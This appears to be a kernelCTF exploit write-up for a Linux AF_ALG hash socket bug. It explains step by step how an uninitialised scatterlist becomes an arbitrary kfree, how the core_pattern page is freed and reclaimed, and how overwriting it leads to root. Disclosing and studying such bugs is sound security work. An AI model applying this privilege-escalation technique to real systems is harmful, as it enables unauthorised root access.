# Vulnerability
This bug reachable if `hash_alloc_result` is fail, code jump to `unlock_free` and call `af_alg_free_sg` on `&ctx->sgl` before `&ctx->sgl` initialized:
```C
static int hash_alloc_result(struct sock *sk, struct hash_ctx *ctx)
{
	....
	ctx->result = sock_kmalloc(sk, ds, GFP_KERNEL);
	if (!ctx->result)
		return -ENOMEM;
}

static int hash_sendmsg(struct socket *sock, struct msghdr *msg,
			size_t ignored)
{
	struct hash_ctx *ctx = ask->private;
	....
	} else if (!msg_data_left(msg)) {
		/*
		 * No data - finalise the prev req if MSG_MORE so any error
		 * comes out here.
		 */
		if (!(msg->msg_flags & MSG_MORE)) {
			err = hash_alloc_result(sk, ctx);
			if (err)
				goto unlock_free;
	....
unlock_free:
	af_alg_free_sg(&ctx->sgl);
	hash_free_result(sk, ctx);
	ctx->more = false;
	goto unlock;
}
```
We can make `hash_alloc_result` fail by making `sock_kmalloc` fail
```C
/*
 * Allocate a memory block from the socket's option memory buffer.
 */
void *sock_kmalloc(struct sock *sk, int size, gfp_t priority)
{
	int optmem_max = READ_ONCE(sysctl_optmem_max);

	if ((unsigned int)size <= optmem_max &&
	    atomic_read(&sk->sk_omem_alloc) + size < optmem_max) {
		void *mem;
		/* First do the add, to avoid the race if kmalloc
		 * might sleep.
		 */
		atomic_add(size, &sk->sk_omem_alloc);
		mem = kmalloc(size, priority);
		if (mem)
			return mem;
		atomic_sub(size, &sk->sk_omem_alloc);
	}
	return NULL;
}
```
We can increase `sk_omem_alloc` by call sendmsg with large control data like this:
```C
    struct msghdr msg = {
        .msg_iovlen = 1,
        .msg_iov = &iov,
        .msg_control = buf,
        .msg_controllen = 0x4cdf,
    };
    sendmsg(opfd2, &msg, 0);
```
At `____sys_sendmsg` it will use `sock_kmalloc` to copy msg control data, so it also can increase `sk->sk_omem_alloc` and we can make future sock_kmalloc fails.
```C
static int ____sys_sendmsg(struct socket *sock, struct msghdr *msg_sys,
			   unsigned int flags, struct used_address *used_address,
			   unsigned int allowed_msghdr_flags)
{
	....
		BUILD_BUG_ON(sizeof(struct cmsghdr) !=
			     CMSG_ALIGN(sizeof(struct cmsghdr)));
		if (ctl_len > sizeof(ctl)) {
			ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);
			if (ctl_buf == NULL)
				goto out;
		}
		err = -EFAULT;
		if (copy_from_user(ctl_buf, msg_sys->msg_control_user, ctl_len))
			goto out_freectl;
		msg_sys->msg_control = ctl_buf;
```

So with this bug we can reach `af_alg_free_sg` and control whole `sgl` because of uninitialized memory:
```C
void af_alg_free_sg(struct af_alg_sgl *sgl)
{
	int i;

	if (sgl->sgt.sgl) {
		if (sgl->need_unpin)
			for (i = 0; i < sgl->sgt.nents; i++)
				unpin_user_page(sg_page(&sgl->sgt.sgl[i]));
		if (sgl->sgt.sgl != sgl->sgl)
			kvfree(sgl->sgt.sgl);
		sgl->sgt.sgl = NULL;
	}
}
```

# Exploit
`sgl` is comes from `hash_ctx` object,  it's allocated at `hash_accept_parent_nokey` when we call accept on bound alg hash socket.
```C
static int hash_accept_parent_nokey(void *private, struct sock *sk)
{
	struct crypto_ahash *tfm = private;
	struct alg_sock *ask = alg_sk(sk);
	struct hash_ctx *ctx;
	unsigned int len = sizeof(*ctx) + crypto_ahash_reqsize(tfm);

	ctx = sock_kmalloc(sk, len, GFP_KERNEL);
	if (!ctx)
		return -ENOMEM;
```

To control uninitialized data, we just use previously allocated msg control data, it also use `sock_kmalloc`
```C
static int ____sys_sendmsg(struct socket *sock, struct msghdr *msg_sys,
			   unsigned int flags, struct used_address *used_address,
			   unsigned int allowed_msghdr_flags)
{
	....
		BUILD_BUG_ON(sizeof(struct cmsghdr) !=
			     CMSG_ALIGN(sizeof(struct cmsghdr)));
		if (ctl_len > sizeof(ctl)) {
			ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);
			if (ctl_buf == NULL)
				goto out;
		}
		err = -EFAULT;
		if (copy_from_user(ctl_buf, msg_sys->msg_control_user, ctl_len))
			goto out_freectl;
		msg_sys->msg_control = ctl_buf;
```
It use the same wrapper function, so it will get the same random kmalloc cache because it will get from the same return address, then we just make sure the size allocation is the same with the size of `hash_ctx`.

In `af_alg_free_sg` we can do two things:
1. Arbitrary unpin pages:
```C
			for (i = 0; i < sgl->sgt.nents; i++)
				unpin_user_page(sg_page(&sgl->sgt.sgl[i]));
```
2. Arbitrary free:
```C
	kvfree(sgl->sgt.sgl);
```

As we know page address is linear mapping of physical address, so if we know our target page address we can free any page. But the struct address itself is located at `*vmemmap_base` which happens to be random, also we don't know what page we targeting. So maybe `unpin_user_page` is not fit with current case.

In kernelCTF environment, at best we can have kernel text leak from prefetch side channel. We also notice `kfree` can free any kernel virtual address, not only slab heap address.

```C
void kvfree(const void *addr)
{
	if (is_vmalloc_addr(addr))
		vfree(addr);
	else
		kfree(addr);
}

void kfree(const void *object)
{
	struct folio *folio;
	struct slab *slab;
	struct kmem_cache *s;

	trace_kfree(_RET_IP_, object);

	if (unlikely(ZERO_OR_NULL_PTR(object)))
		return;

	if (unlikely(!is_slab_addr(object))) { // [1]
		folio = virt_to_folio(object);
		if (slab_virtual_enabled() &&
			CHECK_DATA_CORRUPTION(folio_test_slab(folio),
			"unexpected slab page mapped outside slab range"))
			return;
		free_large_kmalloc(folio, (void *)object);
		return;
	}

	slab = virt_to_slab(object);
	s = slab->slab_cache;
	__kmem_cache_free(s, (void *)object, _RET_IP_);
}
EXPORT_SYMBOL(kfree);

void free_large_kmalloc(struct folio *folio, void *object)
{
	unsigned int order = folio_order(folio);

	if (WARN_ON_ONCE(order == 0))
		pr_warn_once("object pointer: 0x%p\n", object);

	kmemleak_free(object);
	kasan_kfree_large(object);
	kmsan_kfree_large(object);

	mod_lruvec_page_state(folio_page(folio, 0), NR_SLAB_UNRECLAIMABLE_B,
			      -(PAGE_SIZE << order));
	__free_pages(folio_page(folio, 0), order);
}
```

You can see at [1] if the object addr is not slab, it will call `free_large_kmalloc`, then `free_large_kmalloc` will happily call `__free_pages` on passed folio. At this time we just need kernel virtual address, no need page address because `virt_to_folio` will convert it to us.

Because we only have kernel text address (along with data, bss because it's relative), we think futher what if we can `kfree` on kernel data address. We try directly and surprisingly it works!, we try to kfree `core_pattern` address, and it's backed page inserted to buddy page free list. When use command `buddy-dump` with `bata-gef`, it shows our core_pattern page inserted to zone DMA32 pcp free list:
```C
core_pattern: 0xffffffff83808a60
----------------------------------------------------------- zone[1] @ 0xffff88811fffa140 (DMA32) -----------------------------------------------------------
---------------------------------------------------------------------- per_cpu_pageset ----------------------------------------------------------------------
cpu: 0
  pcp_index: 0, order: 0 (0x001000 bytes), mtype: 0 (=Unmovable)
  pcp_index: 1, order: 0 (0x001000 bytes), mtype: 1 (=Movable)
    page:0xffffea00000e0200  size:0x001000  virt:0xffff888003808000-0xffff888003809000  phys:0x0000000003808000-0x0000000003809000 (pcp)
```

If we try to reclaim it looks hard to reclaim, but we found out later we can reclaim if we have memory pressure. We can mmap a big chunk memory before exploit, after we kfree core_pattern we keep mmap and write until core_pattern overwritten. With this technique we need to fake the whole core_pattern page, this is not hard since the whole page only contain kernel text address which we can calculate from side channel kernel text leak.

After we overwrite `core_pattern` we can crash ourselves and make our binary run as root and read the flag.

